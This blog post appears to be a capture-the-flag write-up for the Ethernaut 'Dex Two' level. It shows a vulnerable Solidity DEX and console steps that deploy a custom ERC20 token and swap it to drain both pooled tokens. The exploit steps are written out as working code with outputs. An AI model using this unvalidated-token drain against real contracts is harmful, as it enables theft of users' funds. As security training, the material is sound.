---
layout: post
title: Ethernaut - 23. Dex Two
date:  2022-08-30
tags: ethernaut solidity
---
## Difficulty: 🌕🌕🌑🌑🌑
>As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.<br />
Just because a contract claims to implement the ERC20 spec does not mean it's trust worthy.<br />
Some tokens deviate from the ERC20 spec by not returning a boolean value from their `transfer` methods. See Missing return value bug - At least 130 tokens affected.<br />
Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.<br />
If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.


## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract DexTwo is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

## Writeup
1. Get new instance.
2. Create a ERC20 contract. 
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/IERC20.sol";
    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/ERC20.sol";

    contract MyToken is ERC20 {
      constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
            _mint(msg.sender, initialSupply);
      }
    }
    ```
2. Compile & Deploy
    <img src="https://i.imgur.com/P8R2Qv6.png" alt="remix" style="width:300px;"/>
3. Approve & Transfer
    <img src="https://i.imgur.com/i2cqcVJ.png" alt="remix2" style="width:400px;" />
4. Store addresses to `const` (in console)
    ``` javascript

    const t1 = await contract.token1()
    const t2 = await contract.token2()
    const myToken = 'YOUR_MYTOKEN_CONTRACT_ADDRESS'

    ```
5. Get balance
    ``` javascript

    await contract.balanceOf(t1, contract.address).then(v=>v.toString())
    // 100

    await contract.balanceOf(t2, contract.address).then(v=>v.toString())
    // 100

    await contract.balanceOf(myToken, contract.address).then(v=>v.toString())
    // 100

    ```
6. Swap 
    ``` javascript

    await contract.swap(myToken, t1, 100)

    await contract.balanceOf(myToken, contract.address).then(v=>v.toString())
    // 200

    await contract.getSwapAmount(myToken, t2, 200).then(v=>v.toString())
    // 100 
    // we can swap all myToken to get all t2 token!

    await contract.swap(myToken, t2, 200);

    ```
7. Check tokens' balance
    ``` javascript

    await contract.balanceOf(t1, contract.address).then(v=>v.toString())
    // '0'

    await contract.balanceOf(t2, contract.address).then(v=>v.toString())
    // '0'

    ```
8. Submit instance ξ( ✿＞◡❛)